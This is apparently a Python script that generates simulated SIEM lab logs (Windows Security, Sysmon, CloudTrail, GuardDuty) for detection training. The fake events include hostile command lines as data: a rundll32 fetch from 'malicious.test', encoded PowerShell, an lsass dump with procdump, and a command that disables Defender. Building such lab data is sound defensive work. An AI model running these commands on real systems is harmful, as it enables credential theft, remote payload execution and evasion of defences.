import argparse
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Dict, List


def _iso(ts: datetime) -> str:
    return ts.strftime("%Y-%m-%dT%H:%M:%SZ")


def generate_windows_security(base_time: datetime) -> List[Dict]:
    events: List[Dict] = []
    attacker_ip = "203.0.113.50"
    for i in range(6):
        events.append(
            {
                "timestamp": _iso(base_time + timedelta(seconds=i * 15)),
                "EventID": 4625,
                "AccountName": "administrator",
                "IpAddress": attacker_ip,
                "LogonType": 3,
                "log_type": "security",
            }
        )

    events.extend(
        [
            {
                "timestamp": _iso(base_time + timedelta(minutes=3)),
                "EventID": 4720,
                "SubjectUserName": "administrator",
                "TargetUserName": "svc-backdoor",
                "log_type": "security",
            },
            {
                "timestamp": _iso(base_time + timedelta(minutes=4)),
                "EventID": 4697,
                "SubjectUserName": "administrator",
                "ServiceName": "UpdaterSvc",
                "ServiceFileName": "C:\\Temp\\updater.exe",
                "log_type": "security",
            },
            {
                "timestamp": _iso(base_time + timedelta(minutes=5)),
                "EventID": 4698,
                "SubjectUserName": "administrator",
                "TaskName": "\\Microsoft\\Windows\\UpdateCheck",
                "TaskContent": "powershell -enc SQBFAFgA",
                "log_type": "security",
            },
        ]
    )
    return events


def generate_sysmon(base_time: datetime) -> List[Dict]:
    return [
        {
            "timestamp": _iso(base_time + timedelta(minutes=1)),
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -enc SQBFAFgA",
            "User": "CORP\\administrator",
            "log_type": "sysmon",
        },
        {
            "timestamp": _iso(base_time + timedelta(minutes=2)),
            "EventID": 10,
            "SourceImage": "C:\\Temp\\procdump.exe",
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": "0x1fffff",
            "log_type": "sysmon",
        },
        {
            "timestamp": _iso(base_time + timedelta(minutes=6)),
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\rundll32.exe",
            "CommandLine": "rundll32.exe javascript:\\..\\mshtml,RunHTMLApplication http://malicious.test/payload",
            "User": "CORP\\administrator",
            "log_type": "sysmon",
        },
        {
            "timestamp": _iso(base_time + timedelta(minutes=7)),
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
            "CommandLine": "wmic process call create \"cmd.exe /c whoami\"",
            "User": "CORP\\administrator",
            "log_type": "sysmon",
        },
        {
            "timestamp": _iso(base_time + timedelta(minutes=8)),
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
            "User": "CORP\\administrator",
            "log_type": "sysmon",
        },
    ]


def generate_cloudtrail(base_time: datetime) -> List[Dict]:
    return [
        {
            "eventTime": _iso(base_time + timedelta(minutes=10)),
            "eventSource": "iam.amazonaws.com",
            "eventName": "AttachUserPolicy",
            "userIdentity": {"type": "IAMUser", "arn": "arn:aws:iam::111122223333:user/dev-user"},
            "requestParameters": {"policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"},
            "sourceIPAddress": "198.51.100.10",
            "awsRegion": "us-east-1",
            "log_type": "cloudtrail",
        },
        {
            "eventTime": _iso(base_time + timedelta(minutes=11)),
            "eventSource": "signin.amazonaws.com",
            "eventName": "ConsoleLogin",
            "userIdentity": {"type": "Root"},
            "responseElements": {"ConsoleLogin": "Success"},
            "additionalEventData": {"MFAUsed": "No"},
            "sourceIPAddress": "203.0.113.99",
            "awsRegion": "us-east-1",
            "userAgent": "Mozilla/5.0",
            "log_type": "cloudtrail",
        },
        {
            "eventTime": _iso(base_time + timedelta(minutes=12)),
            "eventSource": "ec2.amazonaws.com",
            "eventName": "DescribeInstances",
            "userIdentity": {"type": "IAMUser", "arn": "arn:aws:iam::111122223333:user/auditor"},
            "sourceIPAddress": "192.0.2.44",
            "awsRegion": "us-east-1",
            "log_type": "cloudtrail",
        },
    ]


def generate_guardduty(base_time: datetime) -> List[Dict]:
    return [
        {
            "updatedAt": _iso(base_time + timedelta(minutes=13)),
            "severity": 8.7,
            "type": "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration",
            "accountId": "111122223333",
            "region": "us-east-1",
            "service": {"action": {"actionType": "AWS_API_CALL"}},
            "resource": {"resourceType": "Instance"},
            "log_type": "guardduty",
        },
        {
            "updatedAt": _iso(base_time + timedelta(minutes=14)),
            "severity": 4.2,
            "type": "Recon:EC2/PortProbeUnprotectedPort",
            "accountId": "111122223333",
            "region": "us-east-1",
            "service": {"action": {"actionType": "NETWORK_CONNECTION"}},
            "resource": {"resourceType": "Instance"},
            "log_type": "guardduty",
        },
    ]


def write_jsonl(path: Path, events: List[Dict]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as handle:
        for event in events:
            handle.write(json.dumps(event) + "\n")


def main() -> None:
    cli = argparse.ArgumentParser(description="Generate simulated SIEM lab telemetry")
    cli.add_argument("--output-dir", default="data/sample_logs", help="Output directory for JSONL logs")
    cli.add_argument("--seed", type=int, default=42, help="Random seed")
    args = cli.parse_args()

    random.seed(args.seed)
    base_time = datetime.now(timezone.utc).replace(microsecond=0) - timedelta(hours=1)
    output = Path(args.output_dir)

    windows_security = generate_windows_security(base_time)
    sysmon = generate_sysmon(base_time)
    cloudtrail = generate_cloudtrail(base_time)
    guardduty = generate_guardduty(base_time)

    write_jsonl(output / "windows_security.jsonl", windows_security)
    write_jsonl(output / "sysmon_events.jsonl", sysmon)
    write_jsonl(output / "cloudtrail_events.jsonl", cloudtrail)
    write_jsonl(output / "guardduty_findings.jsonl", guardduty)

    total = len(windows_security) + len(sysmon) + len(cloudtrail) + len(guardduty)
    print(f"Wrote {total} events to {output}")


if __name__ == "__main__":
    main()
